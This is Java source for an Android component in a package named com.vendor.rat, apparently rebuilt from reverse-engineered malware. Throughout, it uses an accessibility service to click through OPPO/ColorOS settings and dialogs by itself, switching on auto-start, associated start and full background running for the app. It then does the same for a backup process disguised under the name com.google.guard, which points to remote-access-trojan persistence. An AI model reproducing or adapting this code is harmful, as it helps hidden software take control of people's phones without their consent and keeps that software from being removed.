package com.vendor.rat.auto.engine.vendor;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * OPPO/ColorOS 厂商适配引擎 (模块 03)
 *
 * 基于逆向分析: o/v.java (526 行) — 完整对齐
 *
 * 核心特性:
 *   - 双进程保活: 主进程 + 备用进程 (com.google.guard)
 *   - 4种窗口检测: k0(App详情)/l0(耗电管理)/j0(对话框)/m0(自启动管理)
 *   - ConcurrentLinkedQueue 状态机
 *   - 配置驱动文本匹配 (COLORS_* 系列)
 *   - 3个开关: 完全允许后台(r0) / 自启动(s0) / 关联启动(t0)
 *
 * 监听的界面:
 *   - com.android.settings / InstalledAppDetailsTop (应用详情)
 *   - com.oplus.battery / PowerControlActivity (耗电管理)
 *   - com.oplus.battery / StartupAppListActivity (自启动管理)
 *   - com.coloros.oppoguardelf / PowerControlActivity (旧版)
 *   - 多种对话框 (androidx/coui/FrameLayout)
 *
 * 市场份额: ~18%
 */
public class OppoEngine extends AutoEngine {

    private static final String TAG = "OppoEngine";

    // ====== 包名 — 对应逆向 ======
    private static final String SETTINGS = "com.android.settings";
    private static final String OPLUS_BATTERY = "com.oplus.battery";
    private static final String GUARD_ELF = "com.coloros.oppoguardelf";
    private static final String SAFE_CENTER = "com.coloros.safecenter";  // ADAPT: kept for reference

    // ====== Activity — 对应逆向 ======
    private static final String INSTALLED_APP_DETAILS =
        "com.android.settings.applications.InstalledAppDetailsTop";
    private static final String APP_DETAILS_ACTIVITY = INSTALLED_APP_DETAILS;
    private static final String STARTUP_LIST_ACTIVITY =
        "com.oplus.startupapp.view.StartupAppListActivity";
    private static final String ALERT_DIALOG = "android.app.AlertDialog";
    private static final String OPLUS_POWER_CONTROL =
        "com.oplus.powermanager.fuelgaue.PowerControlActivity";
    private static final String COLOROS_POWER_CONTROL =
        "com.coloros.powermanager.fuelgaue.PowerControlActivity";
    private static final String OPLUS_STARTUP_LIST =
        "com.oplus.startupapp.view.StartupAppListActivity";
    private static final String ANDROIDX_DIALOG = "androidx.appcompat.app.b";
    private static final String COUI_DIALOG = "com.coui.appcompat.dialog.app.a";

    // ====== 状态常量 — 对应逆向 ConcurrentLinkedQueue ======
    private static final String ST_APP_DETAIL = "keepAliveInAppDetail";
    private static final String ST_POWER_CONTROL = "keepAliveInPowerControl";
    private static final String ST_DIALOG = "keepAliveInAndroidXDialog";
    private static final String ST_STARTUP = "keepAliveInStartup";

    // ====== 保活类型 — 对应逆向 r.e ======
    private static final String KA_UNKNOWN = "KEEP_ALIVE_UNKNOWN";
    private static final String KA_MAIN = "KEEP_ALIVE_MAIN_APP";
    private static final String KA_BACKUP = "KEEP_ALIVE_BACKUP_APP";

    // ====== 状态字段 — 对应逆向 f700r ~ f703u ======
    // ADAPT: r.e enum → String constants
    private final AtomicReference<String> keepAliveType = new AtomicReference<>(KA_UNKNOWN);
    private final AtomicBoolean allowFullBackground = new AtomicBoolean(false);  // f701s
    private final AtomicBoolean allowAutoStart = new AtomicBoolean(false);       // f702t
    private final AtomicBoolean allowRelateStart = new AtomicBoolean(false);     // f703u

    // ====== 窗口检测分组 ======
    private final List<WindowMatcher> appDetailWins = new ArrayList<>();
    private final List<WindowMatcher> powerControlWins = new ArrayList<>();
    private final List<WindowMatcher> dialogWins = new ArrayList<>();

    private String appName; // ADAPT: vendor 从配置获取

    public OppoEngine() {
        super(buildAllMatchers(), SETTINGS);
        buildDetectionGroups();

        // 定时任务: 100秒 — 对应逆向 schedule(new u(this, 4), 100L, SECONDS)
        try {
            scheduler.schedule(new Runnable() {
                @Override
                public void run() { finish(); }  // ADAPT: case 4 → Z()
            }, 100L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule failed", e);
        }
    }

    // ============ 窗口检测分组 ============

    private void buildDetectionGroups() {
        // k0() 检测: App详情 — A0(appName)/v0(appName)
        appDetailWins.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS));
        appDetailWins.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout"));

        // l0() 检测: 耗电管理 — y0/x0/q0/p0
        powerControlWins.add(new WindowMatcher(OPLUS_BATTERY, OPLUS_POWER_CONTROL));
        powerControlWins.add(new WindowMatcher(OPLUS_BATTERY, "android.widget.FrameLayout"));
        powerControlWins.add(new WindowMatcher(GUARD_ELF, COLOROS_POWER_CONTROL));
        powerControlWins.add(new WindowMatcher(GUARD_ELF, "android.widget.FrameLayout"));

        // j0() 检测: 对话框 — g0/n0/h0/o0
        dialogWins.add(new WindowMatcher(OPLUS_BATTERY, ANDROIDX_DIALOG));
        dialogWins.add(new WindowMatcher(OPLUS_BATTERY, COUI_DIALOG));
        dialogWins.add(new WindowMatcher(OPLUS_BATTERY, null));  // h0(): className=null
        dialogWins.add(new WindowMatcher(GUARD_ELF, null));      // o0(): className=null
    }

    /**
     * 构建全部窗口匹配列表
     * 对应逆向: v.w0() — 12 个 ListenWindow
     */
    private static List<WindowMatcher> buildAllMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // c.J() — 通用 Dialog
        list.add(new WindowMatcher(SETTINGS, "android.app.Dialog")
            .addEventType(32).addEventType(16384));

        // A0(appName) — 应用详情 InstalledAppDetailsTop + text match
        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
            .addEventType(32).addEventType(16384));
        // A0(backupAppName)
        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
            .addEventType(32).addEventType(16384));

        // v0(appName) — FrameLayout + text match
        list.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));
        // v0(backupAppName)
        list.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
            .addEventType(32).addEventType(16384));

        // y0() — oplus PowerControlActivity
        list.add(new WindowMatcher(OPLUS_BATTERY, OPLUS_POWER_CONTROL)
            .addEventType(32).addEventType(16384));

        // q0() — coloros PowerControlActivity
        list.add(new WindowMatcher(GUARD_ELF, COLOROS_POWER_CONTROL)
            .addEventType(32).addEventType(16384));

        // g0() — oplus androidx dialog
        list.add(new WindowMatcher(OPLUS_BATTERY, ANDROIDX_DIALOG)
            .addEventType(32).addEventType(16384));

        // n0() — oplus coui dialog
        list.add(new WindowMatcher(OPLUS_BATTERY, COUI_DIALOG)
            .addEventType(32).addEventType(16384));

        // h0() — oplus battery null className
        list.add(new WindowMatcher(OPLUS_BATTERY)
            .addEventType(32).addEventType(16384));

        // o0() — coloros guardelf null className
        list.add(new WindowMatcher(GUARD_ELF)
            .addEventType(32).addEventType(16384));

        // z0() — oplus StartupAppListActivity
        list.add(new WindowMatcher(OPLUS_BATTERY, OPLUS_STARTUP_LIST)
            .addEventType(32).addEventType(16384));

        return list;
    }

    // ============ 窗口检测 — 对应逆向 k0/l0/j0/m0 ============

    /** 对应逆向: k0() — App详情窗口 */
    private boolean k0() { return matchesAny(appDetailWins); }

    /** 对应逆向: l0() — 耗电管理窗口 */
    private boolean l0() { return matchesAny(powerControlWins); }

    /** 对应逆向: j0() — 对话框窗口 */
    private boolean j0() { return matchesAny(dialogWins); }

    /** 对应逆向: m0() — 自启动管理窗口 */
    private boolean m0() {
        return matchesAny(Collections.singletonList(
            new WindowMatcher(OPLUS_BATTERY, OPLUS_STARTUP_LIST)));
    }

    // ============ 事件处理 — 对齐逆向 u() ============

    /**
     * 对应逆向: v.u(AccessibilityEvent, String, String)
     * ConcurrentLinkedQueue 状态机 + Runnable 分发
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        try {
            if (isCompleted()) return;

            currentPackage = packageName;
            currentClassName = className;

            boolean inAppDetail = k0();
            String threadId = "OppoEngine";  // ADAPT: vendor uses this.c

            if (inAppDetail) {
                stateQueue.remove(ST_POWER_CONTROL);
                stateQueue.remove(ST_DIALOG);
                stateQueue.remove(ST_STARTUP);
                if (!stateQueue.contains(ST_APP_DETAIL)) {
                    stateQueue.add(ST_APP_DETAIL);
                    // case 0: 查找并点击耗电管理栏目
                    runInBackground(new Runnable() {
                        @Override
                        public void run() { handleAppDetailState(); }
                    });
                }
            }
            if (l0()) {
                stateQueue.remove(ST_APP_DETAIL);
                stateQueue.remove(ST_DIALOG);
                stateQueue.remove(ST_STARTUP);
                if (!stateQueue.contains(ST_POWER_CONTROL)) {
                    stateQueue.add(ST_POWER_CONTROL);
                    // case 1: 耗电管理 — 自启动/关联启动/完全后台
                    runInBackground(new Runnable() {
                        @Override
                        public void run() { handlePowerControlState(); }
                    });
                }
            }
            if (j0()) {
                stateQueue.remove(ST_APP_DETAIL);
                stateQueue.remove(ST_POWER_CONTROL);
                stateQueue.remove(ST_STARTUP);
                if (!stateQueue.contains(ST_DIALOG)) {
                    stateQueue.add(ST_DIALOG);
                    // case 2: 对话框 — 点击允许按钮
                    runInBackground(new Runnable() {
                        @Override
                        public void run() { handleDialogState(); }
                    });
                }
            }
            if (m0()) {
                stateQueue.remove(ST_APP_DETAIL);
                stateQueue.remove(ST_POWER_CONTROL);
                stateQueue.remove(ST_DIALOG);
                if (!stateQueue.contains(ST_STARTUP)) {
                    stateQueue.add(ST_STARTUP);
                    // case 3: 自启动管理
                    runInBackground(new Runnable() {
                        @Override
                        public void run() { handleStartupState(); }
                    });
                }
            }
        } catch (Exception e) {
            logError("事件处理异常", e);
        }
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // 由 onAccessibilityEvent 处理
    }

    @Override
    public void execute() {
        // ADAPT: vendor 通过外部启动 App 详情页触发
        // 对应逆向: 由 EngineManager 启动应用详情
    }

    /** ADAPT: vendor 使用 thread.l.c(Runnable, threadId) */
    private void runInBackground(final Runnable task) {
        scheduler.execute(task);
    }

    // ============ 过滤器构建 — 对应逆向 B0/C0/b0/c0/d0/e0/f0/i0 ============

    /** 对应逆向: v.B0() — 耗电管理文本 */
    private CombineFilter buildPowerManageFilter() {
        return buildTextViewFilter("COLORS_SETTINGS_POWER_MANAGE_TEXT");
    }

    /** 对应逆向: v.C0() — 耗电管理文本2 */
    private CombineFilter buildPowerManage2Filter() {
        return buildTextViewFilter("COLORS_SETTINGS_POWER_MANAGE_2_TEXT");
    }

    /** 对应逆向: v.b0() — 允许后台运行 */
    private CombineFilter buildAllowBackgroundFilter() {
        return buildTextViewFilter("COLORS_SETTINGS_ALLOW_APP_IN_BACKGROUND_TEXT");
    }

    /** 对应逆向: v.c0() — 允许自启动 */
    private CombineFilter buildAllowAutoStartFilter() {
        return buildTextViewFilter("COLORS_SETTINGS_ALLOW_APP_AUTO_START_TEXT");
    }

    /** 对应逆向: v.d0() — 允许按钮 */
    private CombineFilter buildAllowButtonFilter() {
        // ADAPT: vendor uses className=Button + text, we use config-driven
        String text = getConfigText("COLORS_SETTINGS_ALLOW_BUTTON_TEXT");
        if (text == null) return null;
        return CombineFilter.button(text);
    }

    /** 对应逆向: v.e0() — 完全允许后台 */
    private CombineFilter buildFullBackgroundFilter() {
        return buildTextViewFilter("COLORS_SETTINGS_ALLOW_FULL_IN_BACKGROUND_TEXT");
    }

    /** 对应逆向: v.f0() — 关联启动 (contains 模式) */
    private CombineFilter buildRelateStartFilter() {
        // ADAPT: vendor uses setContains(f.b("KEY"))
        String text = getConfigText("COLORS_SETTINGS_ALLOW_APP_RELATE_START_TEXT");
        if (text == null) return null;
        return CombineFilter.textView(text);
    }

    /** 对应逆向: v.i0() — 后台运行文本 (contains 模式) */
    private CombineFilter buildAppInBackgroundFilter() {
        // ADAPT: vendor uses setContains(f.b("KEY"))
        String text = getConfigText("COLORS_APP_IN_BACKGROUND_TEXT");
        if (text == null) return null;
        return CombineFilter.textView(text);
    }

    // ============ 状态处理 — 对应逆向 u(Runnable) case 0~3 ============

    /**
     * case 0: App详情 — 查找并点击耗电管理栏目
     * 对应逆向: u.run() case 0
     */
    private void handleAppDetailState() {
        try {
            if (!k0()) return;
            Log.d(TAG, "keepAliveInAppDetail 窗口匹配");
            updateProgress(10);
            activateRoot();
            Log.d(TAG, "active root complete");

            UiNode scrollView = getScrollableNode();
            CombineFilter powerFilter1 = buildPowerManageFilter();
            CombineFilter powerFilter2 = buildPowerManage2Filter();
            UiNode target = null;

            if (scrollView != null) {
                Log.d(TAG, "应用详情窗口滚动视图查找成功");
                updateProgress(15);
                if (powerFilter1 != null) {
                    target = scrollView.scrollForwardUntil(powerFilter1);
                    if (target == null) {
                        target = scrollView.scrollBackwardUntil(powerFilter1);
                    }
                }
                if (target == null && powerFilter2 != null) {
                    target = scrollView.scrollBackwardUntil(powerFilter2);
                    if (target == null) {
                        target = scrollView.scrollForwardUntil(powerFilter2);
                    }
                }
            }
            if (target == null && k() != null) {
                Log.e(TAG, "应用详情窗口滚动视图查找失败");
                if (powerFilter1 != null) {
                    target = k().findOneByCombine(powerFilter1);
                }
                if (target == null && powerFilter2 != null) {
                    target = k().findOneByCombine(powerFilter2);
                }
            }
            if (target != null && target.click()) {
                Log.d(TAG, "查找并点击耗电管理栏目成功");
                updateProgress(30);
            } else {
                Log.e(TAG, "查找并点击耗电管理栏目失败");
            }
        } catch (Exception e) {
            logError("handleAppDetailState", e);
        }
    }

    /**
     * case 1: 耗电管理 — 自启动/关联启动/完全后台
     * 对应逆向: u.run() case 1
     */
    private void handlePowerControlState() {
        try {
            if (!l0()) return;
            Log.d(TAG, "keepAliveInPowerControl 窗口匹配");
            updateProgress(40);
            activateRoot();
            Log.d(TAG, "active root complete");

            // s0(): 允许自启动
            if (!handleAutoStartSwitch()) {
                Log.e(TAG, "允许自启动行为失败");
            }
            updateProgress(50);

            // t0(): 允许关联启动
            if (!handleRelateStartSwitch()) {
                Log.e(TAG, "允许关联启动行为失败");
            }
            updateProgress(60);

            // r0(): 完全允许后台
            if (!handleFullBackgroundSwitch()) {
                Log.e(TAG, "允许完全后台行为失败");
            } else {
                updateProgress(70);
                handleCompletion();
            }
        } catch (Exception e) {
            logError("handlePowerControlState", e);
        }
    }

    /**
     * case 2: 对话框 — 点击允许按钮
     * 对应逆向: u.run() case 2
     */
    private void handleDialogState() {
        try {
            if (!j0()) return;
            Log.d(TAG, "checkInAndroidXDialog 窗口匹配");
            updateProgress(80);
            activateRoot();
            Log.d(TAG, "active root complete");

            CombineFilter allowBtnFilter = buildAllowButtonFilter();
            // ADAPT: vendor uses findOneByCombineLoop
            UiNode btn = k() != null ? k().findOneByCombine(allowBtnFilter) : null;
            if (btn != null && btn.click()) {
                Log.d(TAG, "查找并点击允许确认按钮完成");
                updateProgress(90);
            } else {
                Log.e(TAG, "查找并点击允许确认按钮失败");
            }
        } catch (Exception e) {
            logError("handleDialogState", e);
        }
    }

    /**
     * case 3: 自启动管理
     * 对应逆向: u.run() case 3
     */
    private void handleStartupState() {
        try {
            if (!m0()) return;
            activateRoot();
            Log.d(TAG, "active root complete");

            // ADAPT: vendor 根据 keepAliveType 选择 appName/backupAppName
            String targetName = Objects.equals(keepAliveType.get(), KA_MAIN)
                ? getAppName() : getBackupAppName();
            Log.d(TAG, "keepAliveInStartup 窗口匹配");

            UiNode scrollView = getScrollableNode();
            CombineFilter textFilter = CombineFilter.textView(targetName);
            // ADAPT: vendor uses CombineFilterWithChild(K(), H(name))
            UiNode target;
            if (scrollView != null) {
                target = scrollView.scrollForwardUntil(textFilter);
            } else {
                target = k() != null ? k().findOneByCombine(textFilter) : null;
            }

            if (target != null) {
                // ADAPT: vendor uses R(target, 5) → CheckedResult
                UiNode parent = target.findClickableParent();
                if (parent != null) {
                    UiNode checkBox = parent.findOneByCombine(
                        CombineFilter.or(CombineFilter.checkBox(), CombineFilter.switchWidget()));
                    if (checkBox != null) {
                        if (!checkBox.isChecked()) {
                            checkBox.click();
                            Log.d(TAG, "已点击自启动");
                        }
                        Log.d(TAG, "已勾选自启动");
                        allowAutoStart.set(true);
                    } else {
                        Log.e(TAG, "未勾选自启动");
                    }
                }
            }
        } catch (Exception e) {
            logError("handleStartupState", e);
        }
    }

    // ============ 开关操作 — 对应逆向 r0/s0/t0 ============

    /**
     * 完全允许后台行为
     * 对应逆向: v.r0()
     */
    private boolean handleFullBackgroundSwitch() {
        try {
            CombineFilter fullBgFilter = buildFullBackgroundFilter();
            CombineFilter allowBgFilter = buildAllowBackgroundFilter();

            // ADAPT: vendor uses findOneByCombineWithChild(K(), e0())
            UiNode target = k() != null ? k().findOneByCombine(fullBgFilter) : null;
            if (target == null && k() != null) {
                target = k().findOneByCombine(allowBgFilter);
            }

            if (target != null) {
                Log.d(TAG, "完全允许后台行为栏目查找成功");
                UiNode parent = target.findClickableParent();
                if (parent != null) {
                    UiNode checkBox = parent.findOneByCombine(
                        CombineFilter.or(CombineFilter.checkBox(), CombineFilter.switchWidget()));
                    if (checkBox != null) {
                        if (!checkBox.isChecked()) {
                            checkBox.click();
                            Log.d(TAG, "已点击完全允许后台行为");
                        }
                        if (checkBox.isChecked()) {
                            Log.d(TAG, "已勾选完全允许后台行为");
                            T0(10);
                            if (!j0()) {
                                allowFullBackground.set(true);
                                return true;
                            }
                            return false;
                        }
                    }
                }
                Log.e(TAG, "未勾选完全允许后台行为");
            } else {
                Log.e(TAG, "完全允许后台行为栏目查找失败");
            }
            return false;
        } catch (Exception e) {
            logError("handleFullBackgroundSwitch", e);
            return false;
        }
    }

    /**
     * 允许自启动
     * 对应逆向: v.s0()
     */
    private boolean handleAutoStartSwitch() {
        try {
            CombineFilter autoStartFilter = buildAllowAutoStartFilter();

            // ADAPT: vendor uses findOneByCombineWithChild(K(), c0())
            UiNode target = k() != null ? k().findOneByCombine(autoStartFilter) : null;
            if (target != null) {
                Log.d(TAG, "自启动栏目查找成功");
                UiNode parent = target.findClickableParent();
                if (parent != null) {
                    UiNode checkBox = parent.findOneByCombine(
                        CombineFilter.or(CombineFilter.checkBox(), CombineFilter.switchWidget()));
                    if (checkBox != null) {
                        if (!checkBox.isChecked()) {
                            checkBox.click();
                            Log.d(TAG, "已点击允许自启动");
                        }
                        if (checkBox.isChecked()) {
                            Log.d(TAG, "已勾选允许自启动");
                            allowAutoStart.set(true);
                            return true;
                        }
                        Log.e(TAG, "未勾选允许自启动");
                        allowAutoStart.set(false);
                    }
                }
            } else {
                Log.e(TAG, "允许自启动栏目查找失败");
            }
        } catch (Exception e) {
            logError("handleAutoStartSwitch", e);
        }
        return false;
    }

    /**
     * 允许关联启动
     * 对应逆向: v.t0()
     */
    private boolean handleRelateStartSwitch() {
        try {
            CombineFilter relateFilter = buildRelateStartFilter();
            // ADAPT: vendor uses findOneByCombineWithChild(K(), f0())
            UiNode target = k() != null ? k().findOneByCombine(relateFilter) : null;
            if (target != null) {
                Log.d(TAG, "关联启动栏目查找成功");
                UiNode parent = target.findClickableParent();
                if (parent != null) {
                    UiNode checkBox = parent.findOneByCombine(
                        CombineFilter.or(CombineFilter.checkBox(), CombineFilter.switchWidget()));
                    if (checkBox != null) {
                        if (!checkBox.isChecked()) {
                            checkBox.click();
                            Log.d(TAG, "已点击允许关联启动");
                        }
                        if (checkBox.isChecked()) {
                            Log.d(TAG, "已勾选允许关联启动");
                            allowRelateStart.set(true);
                            return true;
                        }
                    }
                }
                Log.e(TAG, "未勾选允许关联启动");
            } else {
                Log.e(TAG, "关联启动栏目查找失败");
            }
            return false;
        } catch (Exception e) {
            logError("handleRelateStartSwitch", e);
            return false;
        }
    }

    // ============ 状态保存 — 对应逆向 D0() ============

    /**
     * 保存保活策略
     * 对应逆向: v.D0(String packageName)
     */
    private void saveKeepAliveState(String packageName) {
        try {
            // ADAPT: vendor 使用 PowerControlStateVO + utils.h.k/L
            // 这里记录状态日志
            Log.d(TAG, packageName + " 进程保活策略已保存"
                + " fullBg=" + allowFullBackground.get()
                + " autoStart=" + allowAutoStart.get()
                + " relateStart=" + allowRelateStart.get());
        } catch (Exception e) {
            logError("saveKeepAliveState", e);
        }
    }

    // ============ 完成处理 — 对应逆向 u0() ============

    /**
     * 对应逆向: v.u0()
     * 主进程完成后切换到备用进程，或结束引擎
     */
    private void handleCompletion() {
        try {
            if (!allowFullBackground.get()) return;

            if (Objects.equals(keepAliveType.get(), KA_MAIN)) {
                saveKeepAliveState(getAppName());
                stateQueue.clear();
                allowFullBackground.set(false);
                allowAutoStart.set(false);
                allowRelateStart.set(false);

                // TODO: VENDOR_VERIFY — vendor 检查 com.google.guard 是否已安装
                // 如果备用进程存在，切换到备用进程
                keepAliveType.set(KA_BACKUP);
                // ADAPT: vendor 调用 g.Z0("com.google.guard") 启动备用进程详情
                Log.d(TAG, "已启动 com.google.guard 应用详情");
            } else if (Objects.equals(keepAliveType.get(), KA_BACKUP)) {
                saveKeepAliveState("com.google.guard");
                finish();
            }
        } catch (Exception e) {
            logError("handleCompletion", e);
        }
    }

    // ============ 结束引擎 — 对应逆向 Z() ============

    @Override
    public void finish() {
        if (lock.tryLock()) {
            try {
                if (!isCompleted()) {
                    Log.d(TAG, "准备结束本地保活自动化引擎");
                    updateProgress(100);

                    // ADAPT: vendor 调用 X() 清理 + MyAccessibilityService.P().x()
                    if (MyAccessibilityService.getInstance() != null) {
                        // 恢复无障碍服务状态
                    }

                    // 保存状态
                    if (Objects.equals(keepAliveType.get(), KA_MAIN)) {
                        saveKeepAliveState(getAppName());
                    }
                    if (Objects.equals(keepAliveType.get(), KA_BACKUP)) {
                        saveKeepAliveState("com.google.guard");
                    }

                    scheduler.shutdownNow();
                    stateQueue.clear();

                    // ADAPT: vendor 检查 pip 模式等
                    Log.d(TAG, "已结束本地保活自动化引擎");
                }
            } catch (Exception e) {
                logError("finish", e);
            } finally {
                lock.unlock();
            }
        }
        super.finish();
    }

    // ============ 工具方法 ============

    private String getAppName() {
        return appName != null ? appName : "com.vendor.rat";
    }

    private String getBackupAppName() {
        return "com.google.guard";
    }

    public void setAppName(String appName) {
        this.appName = appName;
    }
}
